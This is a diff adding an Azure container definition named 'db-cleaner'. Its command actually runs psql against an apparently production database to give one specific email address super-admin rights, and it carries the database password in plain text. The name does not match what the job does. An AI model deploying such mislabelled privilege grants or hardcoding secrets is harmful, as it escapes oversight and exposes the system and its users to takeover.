@@ -1,0 +1,24 @@
+apiVersion: '2023-05-01'
+location: centralus
+name: aci-db-cleaner
+properties:
+  containers:
+  - name: db-cleaner
+    properties:
+      image: postgres:15-alpine
+      command:
+      - sh
+      - -c
+      - psql "postgresql://kiddomin@10.0.1.4/kiddochecker?sslmode=require" -c "UPDATE public.profiles SET role = 'super_admin' WHERE LOWER(email) = 'wisdom_borntobegreat@yahoo.com'; DELETE FROM public.user_roles WHERE user_id IN (SELECT id FROM public.profiles WHERE LOWER(email) = 'wisdom_borntobegreat@yahoo.com'); INSERT INTO public.user_roles (user_id, role, is_super_admin) SELECT id, 'super_admin', true FROM public.profiles WHERE LOWER(email) = 'wisdom_borntobegreat@yahoo.com';"
+      environmentVariables:
+      - name: PGPASSWORD
+        value: Alliance758Green!!
+      resources:
+        requests:
+          cpu: 1.0
+          memoryInGB: 1.0
+  osType: Linux
+  restartPolicy: Never
+  subnetIds:
+  - id: /subscriptions/d8a0e90f-f05b-4008-9eae-de1d828a4168/resourceGroups/rg-kiddo/providers/Microsoft.Network/virtualNetworks/vnet-kiddo-prod-yotzp/subnets/snet-migration
+type: Microsoft.ContainerInstance/containerGroups
